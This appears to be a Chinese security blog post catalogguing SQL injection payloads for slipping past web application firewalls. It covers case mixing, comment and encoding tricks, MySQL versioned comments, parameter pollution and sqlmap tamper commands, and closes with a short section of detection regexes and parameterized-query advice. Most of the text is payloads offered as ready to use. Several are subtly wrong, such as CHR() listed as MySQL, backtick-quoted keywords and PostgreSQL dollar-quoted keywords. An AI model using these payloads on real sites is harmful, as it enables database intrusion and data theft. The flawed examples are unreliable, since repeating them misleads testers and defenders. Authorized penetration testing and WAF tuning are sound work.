---
title: "SQL 注入 WAF 绕过技术详解：从基础到高级"
date: 2026-05-11T10:00:00+08:00
draft: false
categories: ["攻击技术"]
tags: ["SQL注入", "WAF绕过", "Web安全", "渗透测试"]
description: "深入解析 SQL 注入中 WAF 绕过的各种技术手段，包括大小写混用、注释绕过、编码绕过、内联注释等方法，附带实战 Payload。"
showToc: true
TocOpen: true
---

## 概述

WAF（Web Application Firewall）是 Web 应用最常见的防御手段之一。但在实战中，WAF 并非不可绕过。本文系统梳理 SQL 注入中 WAF 绕过的各种技术，从基础到高级，每个方法都附带可直接使用的 Payload。

## 基础绕过技术

### 大小写混用

WAF 规则通常基于关键字匹配，大小写混用可以绕过简单的正则规则：

```sql
-- 被 WAF 拦截
UNION SELECT 1,2,3--

-- 绕过
uNiOn SeLeCt 1,2,3--
UniON SeleCT 1,2,3--
```

**原理：** 大多数 WAF 规则默认区分大小写，或者只匹配全大写/全小写的形式。

### 注释绕过

利用 SQL 注释打断关键字：

```sql
-- 内联注释
UN/**/ION SEL/**/ECT 1,2,3--

-- 注释填充
/*!UNION*/ /*!SELECT*/ 1,2,3--

-- 混合使用
UN/**/ION/*!SELECT*/1,2,3--
```

**注意：** 不同数据库对注释的处理方式不同，需要针对性测试。

### 编码绕过

多层编码可以绕过 WAF 的解码检测：

```sql
-- URL 编码
%55%4E%49%4F%4E %53%45%4C%45%43%54 1,2,3--

-- 双重编码
%2555%254E%2549%254F%254E %2553%2545%254C%2545%2543%2554 1,2,3--

-- Unicode 编码
%u0055%u004E%u0049%u004F%u004E %u0053%u0045%u004C%u0045%u0043%u0054 1,2,3--
```

## 高级绕过技术

### MySQL 内联注释

MySQL 特有的内联注释，可以指定版本号执行：

```sql
/*!50000UNION*//*!50000SELECT*/1,2,3--

-- 省略版本号（默认执行）
/*!UNION*//*!SELECT*/1,2,3--

-- 结合其他绕过
/*!uNiOn*//*!sElEcT*/1,2,3--
```

**原理：** `/*!NNNNN` 表示只有 MySQL 版本 >= NNNNN 时才执行，WAF 可能无法解析这种语法。

### HTTP 参数污染 (HPP)

利用不同服务器对重复参数的处理差异：

```
# 请求
GET /search?id=1&id=2 HTTP/1.1

# 不同服务器的取值：
# Apache/PHP: id=2（取最后一个）
# Tomcat/Java: id=1（取第一个）
# IIS/ASP: id=1,2（拼接）
```

**实战应用：**

```
# 在 Tomcat 上绕过 WAF
GET /search?id=1&id=2' UNION SELECT 1,2,3-- HTTP/1.1

# WAF 检查 id=1（安全），Tomcat 取 id=1（安全）
# 但后端可能取 id=2' UNION SELECT 1,2,3--（注入成功）
```

### 空白字符绕过

利用数据库允许的空白字符：

```sql
-- MySQL 允许的空白字符
SELECT%0a1,2,3--
SELECT%0b1,2,3--
SELECT%0c1,2,3--
SELECT%0d1,2,3--
SELECT%091,2,3--  (Tab)
SELECT%0a%0b%0c1,2,3--  (组合)
```

### 等价函数替换

用功能等价的函数替代被拦截的关键字：

```sql
-- 被拦截
ORDER BY 1--

-- 等价替换
ORDER%0aby%0a1--
GROUP BY 1 ASC--
LIMIT 1 OFFSET 0--
```

### 特殊符号绕过

```sql
-- 反引号（MySQL）
`UNION` `SELECT` 1,2,3--

-- 括号分割
(UNION)(SELECT)(1),(2),(3)--

-- 加号（MSSQL）
UNION+SELECT+1,2,3--
```

## 数据库特定绕过

### MySQL 特有

```sql
-- scientific 计数法
SELECT 1e0 UNION SELECT 1,2,3--

-- 十六进制
SELECT 0x31 UNION SELECT 1,2,3--

-- chr() 函数
SELECT CHR(49) UNION SELECT 1,2,3--
```

### MSSQL 特有

```sql
-- 分号执行多语句
;SELECT 1;SELECT 2;SELECT 3--

-- EXEC 动态执行
EXEC('SEL'+'ECT 1,2,3')--

-- 信息收集
SELECT @@version--
```

### PostgreSQL 特有

```sql
-- 类型转换绕过
1::int UNION SELECT 1,2,3--

-- dollar-quoted strings
$$UNION$$ $$SELECT$$ 1,2,3--
```

## 实战绕过策略

### 1. 识别 WAF 类型

```bash
# 使用 wafw00f 识别
wafw00f https://target.com

# 手动探测
curl -I https://target.com -H "X-Forwarded-For: 1' OR '1'='1"
```

### 2. 逐步测试

```sql
-- Step 1: 测试基本注入
'

-- Step 2: 测试联合查询
' UNION SELECT 1--

-- Step 3: 测试被拦截的关键字
' UNION SELECT--
' union select--

-- Step 4: 应用绕过技术
' /*!UNION*/ /*!SELECT*/ 1,2,3--
```

### 3. 自动化工具

```bash
# sqlmap 绕过 WAF
sqlmap -u "https://target.com/?id=1" \
  --tamper=space2comment,randomcase,between \
  --random-agent \
  --delay=1

# 常用 tamper 脚本
# space2comment: 空格转注释
# randomcase: 随机大小写
# between: > 转 BETWEEN
# charencode: 字符编码
```

## 检测与防御

### WAF 规则优化

```regex
# 不要只匹配全大写
UNION\s+SELECT  # 不好

# 应该使用不区分大小写
(?i)union\s+select  # 好

# 考虑注释分割
(?i)u\s*n\s*i\s*o\s*n.*?s\s*e\s*l\s*e\s*c\s*t  # 更好
```

### 输入验证

```python
import re

def detect_sqli(payload):
    patterns = [
        r'(?i)(union\s+select)',
        r'(?i)(select\s+.*\s+from)',
        r'(?i)(insert\s+into)',
        r'(?i)(drop\s+table)',
        r'(?i)(or\s+1\s*=\s*1)',
        r"(?i)('(\s)*(or|and)(\s)*)",
    ]
    for pattern in patterns:
        if re.search(pattern, payload):
            return True
    return False
```

### 参数化查询

```python
# Python - 错误示范
query = f"SELECT * FROM users WHERE id = {user_id}"

# Python - 正确示范
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))
```

## 总结

WAF 绕过是渗透测试中的常见需求。掌握这些技术不是为了攻击，而是为了验证 WAF 的有效性。在实际工作中：

1. **先识别 WAF 类型**，针对性选择绕过方法
2. **逐步测试**，从简单到复杂
3. **组合使用**多种绕过技术
4. **自动化工具**提高效率，但手工验证不可少

防御方应该：
1. WAF 规则要覆盖各种编码和变形
2. 不要只依赖 WAF，参数化查询才是根本
3. 定期进行安全测试，验证 WAF 规则的有效性

---

*本文仅供安全研究和授权渗透测试使用。未经授权攻击他人系统是违法行为。*
